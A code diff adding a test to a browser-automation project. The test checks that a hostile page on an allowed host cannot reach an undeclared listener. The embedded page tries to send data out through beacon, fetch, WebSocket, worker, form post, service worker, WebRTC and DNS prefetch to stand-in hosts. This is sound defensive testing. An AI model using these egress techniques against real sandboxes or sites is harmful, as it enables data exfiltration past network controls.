@@ -18,7 +18,7 @@ import type { AddressInfo } from 'node:net';
 import { sleep, stop } from '../acceptance/support.ts';
 import { call, enroll } from '../core/mesh-support.ts';
 import { blank, browser, chromiumPath, finishSetup } from './support.ts';
-import { browserEnv, browserTask } from './m5c-support.ts';
+import { browserEnv, browserTask, events, settled, waitTask } from './m5c-support.ts';
 import { Session } from '../../src/core/browser/session.ts';
 import { HUB_REFUSAL, NO_HUB, type Hub } from '../../src/core/browser/plan.ts';
 import { BROWSER_TASK_HEADER } from '../../src/core/index.ts';
@@ -170,4 +170,69 @@ test('declared names still resolve under the resolver rules; the profile names i
     }
   }
   await site.close();
+});
+
+// The review's egress probe: a page on a declared host reaches for an undeclared listener every
+// way a page can (preconnect, prefetch, a stylesheet and an image under another name, an iframe,
+// a beacon, fetch, a redirect, a WebSocket, an event stream, a worker, popups, a form post, a
+// service worker, WebRTC). None of it arrives.
+test('a hostile page on a declared host gets nothing through to anywhere else', { timeout: 120_000 }, async (t) => {
+  const b = await browser();
+  if (typeof b === 'string') return t.skip(b);
+  await b.close();
+  const sinkHits: string[] = [];
+  const sink = createServer((req, res) => { sinkHits.push(`${req.method} ${req.url}`); res.writeHead(302, { location: '/x' }); res.end(); });
+  sink.on('upgrade', (req, sock) => { sinkHits.push(`UPGRADE ${req.url}`); sock.destroy(); });
+  sink.on('connect', (req, sock) => { sinkHits.push(`CONNECT ${req.url}`); sock.destroy(); });
+  await new Promise<void>((r) => sink.listen(0, '127.0.0.1', r));
+  const sp = (sink.address() as AddressInfo).port;
+  const S = `http://127.0.0.1:${sp}`;
+  const L = `http://localhost:${sp}`;
+  const html = `<!doctype html><html><head>
+<link rel="preconnect" href="${S}/preconnect"><link rel="dns-prefetch" href="//leak-dns.example.test">
+<link rel="prefetch" href="${S}/prefetch"><link rel="stylesheet" href="${L}/css">
+</head><body><h1 id="t">Hostile</h1><div id="out">pending</div>
+<iframe src="${S}/iframe"></iframe><img src="${L}/img">
+<script>
+try { navigator.sendBeacon('${S}/beacon', 'x'); } catch {}
+fetch('${S}/fetch', { mode: 'no-cors' }).catch(() => {});
+fetch('/redir').catch(() => {});
+try { new WebSocket('ws://127.0.0.1:${sp}/ws'); } catch {}
+try { new EventSource('${S}/es'); } catch {}
+try { new Worker(URL.createObjectURL(new Blob(["fetch('${S}/worker',{mode:'no-cors'}).catch(()=>{})"]))); } catch {}
+try { window.open('${S}/popup'); } catch {}
+const f = document.createElement('form'); f.method = 'post'; f.action = '${S}/formpost'; f.target = 'ifr2';
+const i2 = document.createElement('iframe'); i2.name = 'ifr2'; document.body.append(i2, f); f.submit();
+navigator.serviceWorker && navigator.serviceWorker.register('/sw.js').catch(() => {});
+try { const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:${sp}' }, { urls: 'turn:127.0.0.1:${sp}?transport=tcp', username: 'a', credential: 'b' }] }); pc.createDataChannel('x'); pc.createOffer().then((o) => pc.setLocalDescription(o)); } catch {}
+setTimeout(() => { const i = document.createElement('i'); i.id = 'fin'; document.body.append(i); }, 2500);
+</script></body></html>`;
+  const page = createServer((req, res) => {
+    if (req.url === '/redir') { res.writeHead(302, { location: `${S}/redirected` }); res.end(); return; }
+    if (req.url === '/sw.js') { res.writeHead(200, { 'content-type': 'text/javascript' }); res.end(`self.addEventListener('install', () => { fetch('${S}/sw-install', {mode:'no-cors'}).catch(()=>{}); });`); return; }
+    res.writeHead(200, { 'content-type': 'text/html' });
+    res.end(html);
+  });
+  await new Promise<void>((r) => page.listen(0, '127.0.0.1', r));
+  const pp = (page.address() as AddressInfo).port;
+  const m = blank('nova-ui-hub-egress-');
+  const nova = await m.start(browserEnv());
+  try {
+    await finishSetup(m);
+    const plan = { allowed_hosts: [`127.0.0.1:${pp}`], steps: [{ do: 'navigate', url: `http://127.0.0.1:${pp}/` }, { do: 'wait', selector: '#fin', timeout_ms: 8000 }, { do: 'read', selector: '#t', expect: 'Hostile' }], verify: { expect: ['Hostile'] } };
+    const r = await m.send('POST', '/api/v1/tasks', browserTask(plan, 'Open a hostile page'));
+    assert.equal(r.status, 201, JSON.stringify(r.body));
+    const task = await waitTask(m, r.body.id, settled);
+    assert.equal(task.state, 'done', task.reason ?? '');
+    await sleep(1000);
+    assert.deepEqual(sinkHits, [], 'nothing reached the undeclared listener');
+    const hosts = (await events(m, task.id)).filter((e) => e.kind === 'blocked_request').map((e) => e.detail.host);
+    for (const h of [`127.0.0.1:${sp}`, `localhost:${sp}`]) assert.ok(hosts.includes(h), `${h} refused and recorded: ${hosts}`);
+  } finally {
+    await stop(nova);
+    sink.closeAllConnections();
+    sink.close();
+    page.closeAllConnections();
+    page.close();
+  }
 });
